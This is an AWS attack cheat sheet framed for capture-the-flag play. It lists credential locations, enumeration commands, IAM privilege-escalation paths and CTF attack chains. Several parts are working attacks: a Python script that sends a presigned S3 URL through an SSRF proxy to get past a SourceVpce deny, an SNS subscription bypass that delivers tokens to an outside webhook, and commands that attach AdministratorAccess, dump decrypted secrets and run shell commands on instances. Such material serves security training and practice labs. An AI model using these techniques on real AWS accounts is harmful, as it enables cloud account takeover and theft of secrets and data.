# AWS

## Fingerprint

```text
arn:aws:...
AKIA... / ASIA... / AIDA... / AROA...
*.amazonaws.com
*.s3.amazonaws.com
AWS_ACCESS_KEY_ID
x-amz-*
169.254.169.254/latest/meta-data/
```

## Identity

```bash
aws sts get-caller-identity
aws iam get-user
aws iam list-users
aws iam list-roles
aws iam list-attached-user-policies --user-name USER
aws iam list-user-policies --user-name USER
aws iam list-groups-for-user --user-name USER
aws iam get-account-authorization-details > auth.json
```

Without the CLI:

```bash
curl -s "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15" \
  --aws-sigv4 "aws:amz:us-east-1:sts" \
  --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" \
  -H "x-amz-security-token: $AWS_SESSION_TOKEN"
```

## Credential Sources

```text
AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY / AWS_SESSION_TOKEN
~/.aws/credentials
~/.aws/config
instance metadata 169.254.169.254
ECS task metadata 169.254.170.2
EKS IRSA / Pod Identity env vars
Lambda environment variables
CodeBuild / CodePipeline env
GitHub Actions secrets
Terraform state
~/.docker/config.json (ECR auth)
```

## S3

### Enumerate

```bash
aws s3 ls
aws s3 ls s3://BUCKET
aws s3 ls s3://BUCKET --recursive
aws s3api list-objects-v2 --bucket BUCKET
aws s3api list-object-versions --bucket BUCKET
aws s3api get-bucket-location --bucket BUCKET
aws s3api get-bucket-policy --bucket BUCKET
aws s3api get-bucket-acl --bucket BUCKET
aws s3api get-bucket-tagging --bucket BUCKET
aws s3api get-bucket-website --bucket BUCKET
aws s3api get-public-access-block --bucket BUCKET
```

Anonymous:

```bash
aws s3 ls s3://BUCKET --no-sign-request
aws s3 cp s3://BUCKET/key - --no-sign-request
curl -s https://BUCKET.s3.amazonaws.com/
curl -s https://BUCKET.s3.amazonaws.com/?list-type=2
```

### Read

```bash
aws s3 cp s3://BUCKET/key .
aws s3 cp s3://BUCKET/key - 
aws s3api get-object --bucket BUCKET --key KEY out.bin
aws s3api get-object --bucket BUCKET --key KEY --version-id VERSION out.bin
aws s3api get-object --bucket BUCKET --key KEY --request-payer requester out.bin
```

### Presigned URL

```bash
aws s3 presign s3://BUCKET/key --expires-in 3600
```

```python
import boto3
s3 = boto3.client("s3", region_name="us-east-1")
print(s3.generate_presigned_url(
    "get_object",
    Params={"Bucket": "BUCKET", "Key": "KEY"},
    ExpiresIn=3600,
))
```

Presigned URLs carry authentication in the query string. They work from any IP until they expire. Signing covers method, path, query, and signed headers, not the source IP.

### Policy Evaluation

```text
Explicit Deny > Allow
Identity policy + resource policy are both evaluated for same-account access
Resource policy alone can allow cross-account access
Permissions boundary and SCP can still block
```

Read the error:

```text
no identity-based policy allows ...       -> identity policy missing
explicit deny in a resource-based policy  -> bucket / queue / resource policy
```

### SourceVpce Bypass Pattern

Bucket policy:

```json
{
  "Effect": "Deny",
  "Principal": "*",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::BUCKET/private/*",
  "Condition": {
    "StringNotEquals": {
      "aws:SourceVpce": "vpce-0123456789abcdef0"
    }
  }
}
```

`aws:SourceVpce` is set by AWS when traffic reaches S3 through a VPC gateway endpoint. It cannot be spoofed from the internet.

Bypass when you have an SSRF inside the VPC:

```text
1. Sign a presigned GetObject URL with valid credentials.
2. Send the presigned URL through the SSRF sink.
3. The request originates inside EC2, exits through the VPC endpoint,
   aws:SourceVpce matches, and the signature is valid.
```

Worked example:

```python
import boto3, os, ssl, base64, urllib.parse, urllib.request

s3 = boto3.client(
    "s3",
    aws_access_key_id=os.environ["AWS_ACCESS_KEY_ID"],
    aws_secret_access_key=os.environ["AWS_SECRET_ACCESS_KEY"],
    aws_session_token=os.environ["AWS_SESSION_TOKEN"],
    region_name="us-east-1",
    config=boto3.session.Config(signature_version="s3v4"),
)

url = s3.generate_presigned_url(
    "get_object",
    Params={"Bucket": "BUCKET", "Key": "private/flag.txt"},
    ExpiresIn=3600,
)

encoded = urllib.parse.quote(url, safe="")
proxy = f"https://TARGET/proxy?url={encoded}"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

req = urllib.request.Request(proxy)
req.add_header("Authorization", "Basic " + base64.b64encode(b"USER:PASS").decode())

with urllib.request.urlopen(req, context=ctx, timeout=60) as r:
    print(r.read().decode("utf-8", "replace"))
```

The same pattern applies to any condition tied to the request path: `SourceVpce`, `SourceVpc`, `SourceIp`, `ViaAWSService`, or a private endpoint.

Other network conditions to look for:

```text
aws:SourceIp
aws:SourceVpc
aws:SourceVpce
aws:PrincipalOrgID
aws:SourceAccount
aws:SourceArn
aws:ViaAWSService
```

### S3 Gotchas

```text
Requester Pays      -> add --request-payer requester
SSE-KMS             -> need kms:Decrypt on the key
SSE-C               -> need customer key headers
Object Lock         -> retention / legal hold can block delete
Versioning          -> check old versions and delete markers
Static website      -> http://BUCKET.s3-website-REGION.amazonaws.com
Access Points       -> check s3:GetObject on access point ARN
Object Lambda       -> may expose transformed content
```

### Account ID Enumeration

Bucket policies sometimes expose the owning account through `s3:ResourceAccount`. If you can assume a role, attach a session policy that restricts the condition to a guessed prefix and use the success/failure response as an oracle:

```bash
# s3recon automates the digit-by-digit search, ~120 requests for 12 digits
python3 -m s3recon.cli \
  --role arn:aws:iam::ACCOUNT:role/ROLE \
  --bucket BUCKET/index.html
```

The same idea works manually with any S3 action that evaluates `s3:ResourceAccount`. A `403` with "no resource-based policy allows" usually means the wrong account; "no identity-based policy allows" means the account may be right but the identity is missing permission.

## IAM Privilege Escalation

Common paths:

```text
iam:CreatePolicyVersion + --set-as-default
iam:SetDefaultPolicyVersion
iam:AttachUserPolicy / AttachRolePolicy / AttachGroupPolicy
iam:PutUserPolicy / PutRolePolicy / PutGroupPolicy
iam:AddUserToGroup
iam:CreateAccessKey
iam:CreateLoginProfile / UpdateLoginProfile
iam:UpdateAssumeRolePolicy + sts:AssumeRole
iam:PassRole + ec2:RunInstances
iam:PassRole + lambda:CreateFunction + InvokeFunction
iam:PassRole + lambda:UpdateFunctionCode + InvokeFunction
iam:PassRole + glue:CreateDevEndpoint
iam:PassRole + cloudformation:CreateStack
iam:PassRole + sagemaker:CreateNotebookInstance
iam:PassRole + codebuild:StartBuild
iam:PassRole + ecs:RunTask
ssm:SendCommand on EC2
sts:AssumeRole chain
```

Examples:

```bash
# create a new admin policy version
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY \
  --policy-document file://admin.json \
  --set-as-default

# attach admin
aws iam attach-user-policy \
  --user-name USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# assume a role
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT:role/ROLE \
  --role-session-name pwn

# run a command on an instance
aws ssm send-command \
  --instance-ids i-0123456789abcdef0 \
  --document-name AWS-RunShellScript \
  --parameters commands='cat /flag*'
```

`iam:PassRole` is the classic confused deputy. Look for services that accept a role ARN and then execute attacker-controlled code.

## Lambda

```bash
aws lambda list-functions
aws lambda get-function --function-name FN
aws lambda get-function-configuration --function-name FN
aws lambda invoke --function-name FN out.json
aws lambda update-function-code --function-name FN --zip-file fileb://payload.zip
```

Look for environment variables, layers, role ARN, and source in the deployment package.

## SNS

```bash
aws sns list-topics
aws sns get-topic-attributes --topic-arn TOPIC_ARN
aws sns list-subscriptions-by-topic --topic-arn TOPIC_ARN
aws sns get-subscription-attributes --subscription-arn SUB_ARN
```

### StringLike Subscription Bypass

A topic policy may allow anyone to subscribe when the endpoint matches a pattern:

```json
{
  "Effect": "Allow",
  "Principal": "*",
  "Action": "sns:Subscribe",
  "Resource": "arn:aws:sns:REGION:ACCOUNT:TOPIC",
  "Condition": {
    "StringLike": {
      "sns:Endpoint": "*@company.example"
    }
  }
}
```

`StringLike` is a string match, not an email validator. With the `https` protocol, a URL whose query string ends in the allowed pattern passes:

```bash
aws sns subscribe \
  --topic-arn arn:aws:sns:REGION:ACCOUNT:TOPIC \
  --protocol https \
  --notification-endpoint 'https://webhook.site/UUID?x=@company.example'
```

Confirm the subscription, then trigger the application so the token or message is delivered to the webhook:

```bash
aws sns confirm-subscription --topic-arn TOPIC_ARN --token TOKEN
aws sns publish --topic-arn TOPIC_ARN --message 'test'
```

If email delivery is blocked, use an HTTPS endpoint you control. SNS wraps the payload in a `Notification` JSON object; the application's token is usually inside `Message`.

### API Gateway / Lambda Paths

```bash
aws apigateway get-rest-apis
aws apigateway get-resources --rest-api-id API_ID
aws apigateway get-method --rest-api-id API_ID --resource-id RES_ID --http-method POST
aws apigateway get-stages --rest-api-id API_ID

aws apigatewayv2 get-apis
aws lambda get-policy --function-name FN
aws lambda invoke --function-name FN out.json
```

The same Lambda can sit behind multiple APIs or stages with different request validation. A schema-validated API may reject a body that a second, older API accepts. Try the direct Lambda invoke path and function URL as well.

### Path Traversal in Lambda

Python's `os.path.join` discards earlier components when a later component is absolute:

```python
import os

os.path.join("templates", "birthday.txt")  # templates/birthday.txt
os.path.join("templates", "/flag.txt")     # /flag.txt
```

A filter that only blocks `..` is bypassed by an absolute path. In an S3-backed Lambda, the result is often a read from the private bucket:

```json
{"template": "/flag", "name": "guest"}
```

If the request is rejected, remove schema validation by using the alternate API Gateway or send the body directly to the function.

## Secrets Manager / SSM

```bash
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET
aws ssm describe-parameters
aws ssm get-parameters-by-path --path / --recursive --with-decryption
aws ssm get-parameter --name NAME --with-decryption
```

## ECR / ECS

```bash
aws ecr describe-repositories
aws ecr list-images --repository-name REPO
aws ecr get-login-password | docker login --username AWS --password-stdin ACCOUNT.dkr.ecr.REGION.amazonaws.com
docker pull ACCOUNT.dkr.ecr.REGION.amazonaws.com/REPO:TAG

aws ecs list-clusters
aws ecs list-services --cluster CLUSTER
aws ecs describe-task-definition --task-definition TASK
aws ecs execute-command --cluster CLUSTER --task TASK --container NAME --interactive --command /bin/sh
```

Container images often contain secrets, source, and flags in layers.

## Cognito

```bash
aws cognito-idp list-user-pools --max-results 60
aws cognito-idp list-users --user-pool-id POOL
aws cognito-identity list-identity-pools --max-results 60
aws cognito-identity get-id --identity-pool-id POOL --logins PROVIDER=TOKEN
aws cognito-identity get-credentials-for-identity --identity-id ID --logins PROVIDER=TOKEN
```

## Other Useful Services

```bash
aws cloudformation list-stacks
aws cloudformation describe-stacks --stack-name STACK
aws cloudformation get-template --stack-name STACK

aws codebuild list-projects
aws codebuild batch-get-projects --names NAME

aws ec2 describe-instances
aws ec2 get-console-output --instance-id i-...
aws ec2 describe-snapshots --owner-ids self
aws ec2 describe-images --owners self

aws eks list-clusters
aws eks update-kubeconfig --name CLUSTER
```

## CTF Chains

```text
SSRF -> IMDS -> role -> S3 private object
SSRF -> IMDS -> role -> Secrets Manager -> admin creds
Leaked access key -> enumerate-iam -> privesc -> admin
Public bucket -> list -> download flag
Lambda env -> AWS keys -> S3
ECR image -> source / secrets -> cloud API
EC2 user-data -> bootstrap secrets
SNS StringLike endpoint -> webhook -> invitation token -> weak API Gateway -> os.path.join traversal -> private bucket
s3:ResourceAccount oracle -> bucket owner account ID -> cross-account role
```

## References

* [AWS IAM policy evaluation](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_evaluation-logic.html)
* [AWS S3 presigned URLs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/using-presigned-url.html)
* [Rhino Security Labs IAM privesc](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [HackTricks AWS](https://book.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
* [flaws.cloud](http://flaws.cloud/)
* [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat)
